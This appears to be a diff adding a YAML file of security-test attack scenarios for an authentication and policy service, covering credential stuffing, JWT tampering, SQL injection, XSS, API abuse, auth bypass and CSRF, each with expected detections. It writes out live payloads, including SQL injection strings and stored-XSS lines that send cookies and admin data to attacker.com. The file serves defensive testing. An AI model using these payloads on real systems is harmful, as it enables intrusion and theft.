@@ -1,0 +1,663 @@
+# Comprehensive Security Attack Scenarios
+# Based on OWASP Top 10 and MITRE ATT&CK Framework
+
+# Credential Stuffing Attack Scenario
+apiVersion: security-testing.rust-security.com/v1alpha1
+kind: AttackScenario
+metadata:
+  name: credential-stuffing-comprehensive
+  labels:
+    attack-type: "credential-stuffing"
+    owasp-category: "A07-identification-authentication-failures"
+    mitre-technique: "T1110.004"
+    severity: "high"
+    automation: "enabled"
+spec:
+  description: "Comprehensive credential stuffing attack using breached credentials database"
+  target:
+    services: ["auth-service"]
+    endpoints: ["/oauth/token", "/login", "/api/v1/auth"]
+    environment: "development"
+  
+  attack_parameters:
+    duration: "10m"
+    request_rate: 20  # requests per second
+    concurrent_threads: 5
+    credential_sources:
+      - "rockyou.txt"
+      - "common_passwords.txt"
+      - "breached_credentials.csv"
+    user_agents:
+      - "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+      - "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
+      - "curl/7.68.0"
+    
+  attack_vectors:
+    - name: "common-credentials"
+      payload_template: |
+        {
+          "username": "{{username}}",
+          "password": "{{password}}",
+          "grant_type": "password"
+        }
+      credentials:
+        - ["admin", "password"]
+        - ["admin", "admin"]
+        - ["user", "password"]
+        - ["test", "test"]
+        - ["administrator", "password"]
+    
+    - name: "dictionary-attack"
+      payload_template: |
+        {
+          "username": "admin",
+          "password": "{{password}}",
+          "grant_type": "password"
+        }
+      password_list: "common_passwords.txt"
+    
+    - name: "username-enumeration"
+      payload_template: |
+        {
+          "username": "{{username}}",
+          "password": "invalid_password",
+          "grant_type": "password"
+        }
+      username_list: "common_usernames.txt"
+  
+  evasion_techniques:
+    - name: "user-agent-rotation"
+      description: "Rotate User-Agent headers"
+      enabled: true
+    
+    - name: "ip-spoofing"
+      description: "Use X-Forwarded-For headers"
+      headers:
+        X-Forwarded-For: ["192.168.1.{}", "10.0.0.{}", "172.16.0.{}"]
+      enabled: true
+    
+    - name: "timing-variance"
+      description: "Variable timing between requests"
+      min_delay: 100  # milliseconds
+      max_delay: 2000
+      enabled: true
+  
+  success_criteria:
+    max_successful_logins: 0
+    max_false_positives: 2
+    required_detection_rate: 95.0
+    max_response_time_degradation: 200  # percent
+  
+  expected_detections:
+    - type: "suspicious-authentication-pattern"
+      confidence_threshold: 0.85
+      detection_time_limit: 30  # seconds
+      mitigation_actions: ["rate-limit", "account-lockout", "captcha"]
+    
+    - type: "brute-force-attack"
+      confidence_threshold: 0.90
+      detection_time_limit: 60
+      mitigation_actions: ["ip-block", "alert-soc"]
+
+---
+
+# JWT Token Tampering Scenario
+apiVersion: security-testing.rust-security.com/v1alpha1
+kind: AttackScenario
+metadata:
+  name: jwt-tampering-advanced
+  labels:
+    attack-type: "jwt-tampering"
+    owasp-category: "A02-cryptographic-failures"
+    mitre-technique: "T1552.001"
+    severity: "critical"
+    automation: "enabled"
+spec:
+  description: "Advanced JWT token tampering and cryptographic attacks"
+  target:
+    services: ["auth-service", "policy-service"]
+    endpoints: ["/admin/*", "/api/v1/users", "/api/v1/policies"]
+    environment: "development"
+  
+  prerequisites:
+    - name: "obtain-valid-token"
+      description: "Obtain valid JWT token for tampering"
+      credentials: "valid_test_user"
+  
+  attack_vectors:
+    - name: "algorithm-confusion"
+      description: "Change algorithm from RS256 to HS256"
+      transformations:
+        - type: "header-modification"
+          field: "alg"
+          value: "HS256"
+        - type: "signature-replacement"
+          method: "hmac-sha256"
+          key: "public_key_as_secret"
+    
+    - name: "none-algorithm"
+      description: "Set algorithm to none"
+      transformations:
+        - type: "header-modification"
+          field: "alg"
+          value: "none"
+        - type: "signature-removal"
+    
+    - name: "privilege-escalation"
+      description: "Modify claims for privilege escalation"
+      transformations:
+        - type: "payload-modification"
+          field: "role"
+          value: "admin"
+        - type: "payload-modification"
+          field: "permissions"
+          value: ["read", "write", "admin"]
+    
+    - name: "expiration-extension"
+      description: "Extend token expiration"
+      transformations:
+        - type: "payload-modification"
+          field: "exp"
+          value: "{{future_timestamp}}"
+    
+    - name: "weak-secret-brute-force"
+      description: "Brute force weak signing secrets"
+      secrets_wordlist: ["secret", "key", "jwt", "token", "password", "123456"]
+  
+  validation_bypass_attempts:
+    - name: "signature-stripping"
+      description: "Remove signature validation"
+    
+    - name: "claims-injection"
+      description: "Inject malicious claims"
+      claims:
+        - {"admin": true}
+        - {"user_id": "1"}
+        - {"bypass": "security"}
+  
+  success_criteria:
+    max_successful_authentications: 0
+    max_unauthorized_access: 0
+    required_detection_rate: 98.0
+    max_response_time_ms: 5000
+  
+  expected_detections:
+    - type: "malicious-jwt-token"
+      confidence_threshold: 0.95
+      detection_time_limit: 5
+      mitigation_actions: ["block-request", "invalidate-session"]
+    
+    - type: "cryptographic-attack"
+      confidence_threshold: 0.90
+      detection_time_limit: 15
+      mitigation_actions: ["alert-security-team", "log-incident"]
+
+---
+
+# SQL Injection Attack Scenario
+apiVersion: security-testing.rust-security.com/v1alpha1
+kind: AttackScenario
+metadata:
+  name: sql-injection-comprehensive
+  labels:
+    attack-type: "sql-injection"
+    owasp-category: "A03-injection"
+    mitre-technique: "T1190"
+    severity: "critical"
+    automation: "enabled"
+spec:
+  description: "Comprehensive SQL injection testing across all input vectors"
+  target:
+    services: ["auth-service", "policy-service"]
+    endpoints: ["/search", "/api/v1/users", "/api/v1/reports", "/login"]
+    parameters: ["q", "id", "username", "filter", "sort"]
+    environment: "development"
+  
+  attack_vectors:
+    - name: "union-based-injection"
+      description: "Union-based SQL injection"
+      payloads:
+        - "' UNION SELECT username,password FROM users--"
+        - "' UNION SELECT 1,version(),database()--"
+        - "' UNION SELECT table_name,column_name FROM information_schema.columns--"
+    
+    - name: "boolean-blind-injection"
+      description: "Boolean-based blind SQL injection"
+      payloads:
+        - "' AND (SELECT COUNT(*) FROM users) > 0--"
+        - "' AND (SELECT SUBSTRING(username,1,1) FROM users WHERE id=1)='a'--"
+        - "' AND (SELECT LENGTH(password) FROM users WHERE id=1) > 8--"
+    
+    - name: "time-based-blind-injection"
+      description: "Time-based blind SQL injection"
+      payloads:
+        - "'; WAITFOR DELAY '00:00:05'--"
+        - "' AND (SELECT COUNT(*) FROM users) > 0 AND SLEEP(5)--"
+        - "'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--"
+    
+    - name: "error-based-injection"
+      description: "Error-based SQL injection"
+      payloads:
+        - "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--"
+        - "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
+        - "'; EXEC xp_cmdshell('dir')--"
+    
+    - name: "second-order-injection"
+      description: "Second-order SQL injection"
+      payloads:
+        - "admin'/**/OR/**/1=1--"
+        - "test'; INSERT INTO users VALUES('hacker','password')--"
+    
+    - name: "nosql-injection"
+      description: "NoSQL injection patterns"
+      payloads:
+        - "'; return 1=1; //"
+        - "' || '1'=='1"
+        - "{\"$where\": \"this.username == 'admin'\"}"
+  
+  encoding_variations:
+    - name: "url-encoding"
+      enabled: true
+    - name: "double-url-encoding"
+      enabled: true
+    - name: "unicode-encoding"
+      enabled: true
+    - name: "html-entity-encoding"
+      enabled: true
+  
+  evasion_techniques:
+    - name: "comment-insertion"
+      patterns: ["/**/", "--", "#", ";%00"]
+    
+    - name: "case-variation"
+      enabled: true
+    
+    - name: "whitespace-variation"
+      characters: [" ", "\t", "\n", "\r", "/**/"]
+    
+    - name: "function-obfuscation"
+      replacements:
+        "SELECT": ["SeLeCt", "S/**/ELECT", "S\nELECT"]
+        "UNION": ["UnIoN", "U/**/NION", "U\nNION"]
+  
+  success_criteria:
+    max_data_exposure: 0
+    max_database_modifications: 0
+    required_detection_rate: 95.0
+    max_response_time_ms: 10000
+  
+  expected_detections:
+    - type: "sql-injection-attempt"
+      confidence_threshold: 0.92
+      detection_time_limit: 1
+      mitigation_actions: ["block-request", "sanitize-input"]
+    
+    - type: "database-attack"
+      confidence_threshold: 0.88
+      detection_time_limit: 5
+      mitigation_actions: ["waf-block", "alert-dba"]
+
+---
+
+# Cross-Site Scripting (XSS) Scenario
+apiVersion: security-testing.rust-security.com/v1alpha1
+kind: AttackScenario
+metadata:
+  name: xss-comprehensive-attack
+  labels:
+    attack-type: "cross-site-scripting"
+    owasp-category: "A03-injection"
+    mitre-technique: "T1059.007"
+    severity: "high"
+    automation: "enabled"
+spec:
+  description: "Comprehensive XSS attack testing including stored, reflected, and DOM-based"
+  target:
+    services: ["auth-service", "policy-service"]
+    endpoints: ["/comments", "/profile", "/search", "/api/v1/content"]
+    parameters: ["content", "title", "description", "q"]
+    environment: "development"
+  
+  attack_vectors:
+    - name: "reflected-xss"
+      description: "Reflected XSS attacks"
+      payloads:
+        - "<script>alert('XSS')</script>"
+        - "<img src=x onerror=alert('XSS')>"
+        - "<svg/onload=alert('XSS')>"
+        - "javascript:alert('XSS')"
+        - "<iframe src=javascript:alert('XSS')></iframe>"
+    
+    - name: "stored-xss"
+      description: "Stored XSS attacks"
+      payloads:
+        - "<script>fetch('/admin/users').then(r=>r.text()).then(d=>fetch('http://attacker.com',{method:'POST',body:d}))</script>"
+        - "<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>"
+        - "<script>new Image().src='http://attacker.com/log?'+document.cookie</script>"
+    
+    - name: "dom-based-xss"
+      description: "DOM-based XSS attacks"
+      payloads:
+        - "#<script>alert('XSS')</script>"
+        - "#javascript:alert('XSS')"
+        - "#<img src=x onerror=alert('XSS')>"
+    
+    - name: "filter-bypass-xss"
+      description: "Filter bypass techniques"
+      payloads:
+        - "<ScRiPt>alert('XSS')</ScRiPt>"
+        - "<script>al\x65rt('XSS')</script>"
+        - "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>"
+        - "<script>window[\"al\"+\"ert\"](\"XSS\")</script>"
+        - "<<SCRIPT>alert('XSS')//<</SCRIPT>"
+    
+    - name: "event-handler-xss"
+      description: "Event handler based XSS"
+      payloads:
+        - "<input onfocus=alert('XSS') autofocus>"
+        - "<select onfocus=alert('XSS') autofocus>"
+        - "<textarea onfocus=alert('XSS') autofocus>"
+        - "<button onclick=alert('XSS')>Click</button>"
+        - "<body onload=alert('XSS')>"
+  
+  encoding_evasions:
+    - name: "html-entity-encoding"
+      enabled: true
+    - name: "url-encoding"
+      enabled: true
+    - name: "unicode-encoding"
+      enabled: true
+    - name: "hex-encoding"
+      enabled: true
+  
+  context_variations:
+    - name: "html-context"
+      injection_points: ["<div>USER_INPUT</div>"]
+    
+    - name: "attribute-context"
+      injection_points: ["<input value='USER_INPUT'>"]
+    
+    - name: "javascript-context"
+      injection_points: ["<script>var x = 'USER_INPUT';</script>"]
+    
+    - name: "css-context"
+      injection_points: ["<style>body { background: USER_INPUT; }</style>"]
+  
+  success_criteria:
+    max_script_executions: 0
+    max_data_exfiltrations: 0
+    required_detection_rate: 90.0
+    max_stored_payloads: 0
+  
+  expected_detections:
+    - type: "xss-attempt"
+      confidence_threshold: 0.85
+      detection_time_limit: 1
+      mitigation_actions: ["sanitize-input", "csp-block"]
+    
+    - type: "malicious-script-injection"
+      confidence_threshold: 0.90
+      detection_time_limit: 2
+      mitigation_actions: ["block-request", "alert-security"]
+
+---
+
+# API Abuse and Rate Limit Testing
+apiVersion: security-testing.rust-security.com/v1alpha1
+kind: AttackScenario
+metadata:
+  name: api-abuse-comprehensive
+  labels:
+    attack-type: "api-abuse"
+    owasp-category: "A10-server-side-request-forgery"
+    mitre-technique: "T1499.004"
+    severity: "medium"
+    automation: "enabled"
+spec:
+  description: "Comprehensive API abuse testing including rate limiting and resource exhaustion"
+  target:
+    services: ["auth-service", "policy-service"]
+    endpoints: ["/api/v1/users", "/api/v1/reports", "/api/v1/export", "/search"]
+    environment: "development"
+  
+  attack_patterns:
+    - name: "rate-limit-bypass"
+      description: "Attempt to bypass rate limiting"
+      techniques:
+        - "header-manipulation"
+        - "ip-spoofing"
+        - "distributed-requests"
+      request_rate: 1000  # requests per second
+      duration: "2m"
+    
+    - name: "resource-exhaustion"
+      description: "Resource exhaustion attacks"
+      techniques:
+        - "large-payload-requests"
+        - "slow-requests"
+        - "connection-flooding"
+      concurrent_connections: 500
+    
+    - name: "api-enumeration"
+      description: "API endpoint enumeration"
+      wordlists:
+        - "api_endpoints.txt"
+        - "common_paths.txt"
+      status_codes: [200, 301, 302, 403, 500]
+    
+    - name: "parameter-pollution"
+      description: "HTTP parameter pollution"
+      techniques:
+        - "duplicate-parameters"
+        - "array-injection"
+        - "parameter-confusion"
+  
+  bypass_techniques:
+    - name: "header-spoofing"
+      headers:
+        X-Forwarded-For: "192.168.1.1"
+        X-Real-IP: "10.0.0.1"
+        X-Client-IP: "172.16.0.1"
+    
+    - name: "user-agent-rotation"
+      user_agents:
+        - "Mozilla/5.0 (compatible; Googlebot/2.1)"
+        - "Mozilla/5.0 (compatible; Bingbot/2.0)"
+        - "curl/7.68.0"
+    
+    - name: "distributed-attack"
+      source_ips: "proxy_list.txt"
+      concurrent_sources: 50
+  
+  payload_variations:
+    - name: "large-json-payloads"
+      size_range: [1MB, 10MB]
+    
+    - name: "deeply-nested-json"
+      nesting_depth: 1000
+    
+    - name: "malformed-requests"
+      types: ["invalid-json", "truncated-headers", "malformed-url"]
+  
+  success_criteria:
+    max_successful_requests: 1000
+    required_rate_limiting: true
+    max_response_time_degradation: 500  # percent
+    required_detection_rate: 80.0
+  
+  expected_detections:
+    - type: "api-abuse-pattern"
+      confidence_threshold: 0.80
+      detection_time_limit: 30
+      mitigation_actions: ["rate-limit", "temporary-block"]
+    
+    - type: "resource-exhaustion-attack"
+      confidence_threshold: 0.85
+      detection_time_limit: 60
+      mitigation_actions: ["connection-limit", "alert-ops"]
+
+---
+
+# Authentication Bypass Testing
+apiVersion: security-testing.rust-security.com/v1alpha1
+kind: AttackScenario
+metadata:
+  name: authentication-bypass-advanced
+  labels:
+    attack-type: "authentication-bypass"
+    owasp-category: "A07-identification-authentication-failures"
+    mitre-technique: "T1078"
+    severity: "critical"
+    automation: "enabled"
+spec:
+  description: "Advanced authentication bypass techniques testing"
+  target:
+    services: ["auth-service"]
+    endpoints: ["/admin/*", "/api/v1/users", "/api/v1/admin", "/dashboard"]
+    environment: "development"
+  
+  bypass_techniques:
+    - name: "header-injection"
+      description: "Authentication bypass via header injection"
+      headers:
+        X-User-Id: "1"
+        X-Admin: "true"
+        X-Role: "admin"
+        X-Authenticated: "true"
+    
+    - name: "parameter-manipulation"
+      description: "Authentication bypass via parameter manipulation"
+      parameters:
+        admin: "true"
+        role: "administrator"
+        user_id: "0"
+        bypass: "1"
+    
+    - name: "session-manipulation"
+      description: "Session manipulation attacks"
+      techniques:
+        - "session-fixation"
+        - "session-hijacking"
+        - "session-prediction"
+    
+    - name: "oauth-bypass"
+      description: "OAuth authentication bypass"
+      techniques:
+        - "state-parameter-manipulation"
+        - "redirect-uri-manipulation"
+        - "scope-elevation"
+    
+    - name: "jwt-bypass"
+      description: "JWT authentication bypass"
+      techniques:
+        - "missing-signature-verification"
+        - "algorithm-confusion"
+        - "weak-secret-exploitation"
+  
+  cookie_manipulation:
+    - name: "privilege-escalation"
+      cookie_modifications:
+        - "admin=true"
+        - "role=administrator"
+        - "permissions=all"
+    
+    - name: "session-replay"
+      description: "Replay old or expired sessions"
+    
+    - name: "cookie-injection"
+      malicious_cookies:
+        - "auth_bypass=1"
+        - "is_admin=true"
+        - "user_level=999"
+  
+  timing_attacks:
+    - name: "response-time-analysis"
+      description: "Analyze response times for user enumeration"
+      techniques:
+        - "valid-vs-invalid-users"
+        - "password-verification-timing"
+  
+  success_criteria:
+    max_unauthorized_access: 0
+    max_privilege_escalations: 0
+    required_detection_rate: 98.0
+    max_false_positives: 1
+  
+  expected_detections:
+    - type: "authentication-bypass-attempt"
+      confidence_threshold: 0.95
+      detection_time_limit: 5
+      mitigation_actions: ["block-request", "alert-security"]
+    
+    - type: "privilege-escalation-attempt"
+      confidence_threshold: 0.90
+      detection_time_limit: 10
+      mitigation_actions: ["terminate-session", "investigate"]
+
+---
+
+# CSRF Attack Scenario
+apiVersion: security-testing.rust-security.com/v1alpha1
+kind: AttackScenario
+metadata:
+  name: csrf-comprehensive-attack
+  labels:
+    attack-type: "csrf"
+    owasp-category: "A01-broken-access-control"
+    mitre-technique: "T1185"
+    severity: "medium"
+    automation: "enabled"
+spec:
+  description: "Comprehensive CSRF attack testing"
+  target:
+    services: ["auth-service", "policy-service"]
+    endpoints: ["/admin/users", "/api/v1/settings", "/api/v1/policies", "/transfer"]
+    environment: "development"
+  
+  attack_vectors:
+    - name: "simple-csrf"
+      description: "Simple CSRF attacks"
+      payloads:
+        - "<img src='http://target.com/api/v1/users/delete/1'>"
+        - "<form action='http://target.com/api/v1/settings' method='POST'><input name='admin' value='true'><script>document.forms[0].submit()</script></form>"
+    
+    - name: "json-csrf"
+      description: "JSON CSRF attacks"
+      payloads:
+        - "fetch('http://target.com/api/v1/users', {method: 'POST', body: JSON.stringify({role: 'admin'}), headers: {'Content-Type': 'application/json'}})"
+    
+    - name: "csrf-with-file-upload"
+      description: "CSRF with file upload"
+      techniques:
+        - "multipart-form-data"
+        - "file-upload-bypass"
+  
+  bypass_techniques:
+    - name: "content-type-bypass"
+      content_types:
+        - "text/plain"
+        - "application/x-www-form-urlencoded"
+        - "multipart/form-data"
+    
+    - name: "method-override"
+      techniques:
+        - "x-http-method-override"
+        - "method-parameter"
+    
+    - name: "referer-spoofing"
+      referers:
+        - "http://target.com"
+        - "https://target.com"
+        - "http://www.target.com"
+  
+  success_criteria:
+    max_successful_attacks: 0
+    required_csrf_protection: true
+    required_detection_rate: 85.0
+    max_state_changes: 0
+  
+  expected_detections:
+    - type: "csrf-attack"
+      confidence_threshold: 0.85
+      detection_time_limit: 5
+      mitigation_actions: ["validate-origin", "check-csrf-token"]
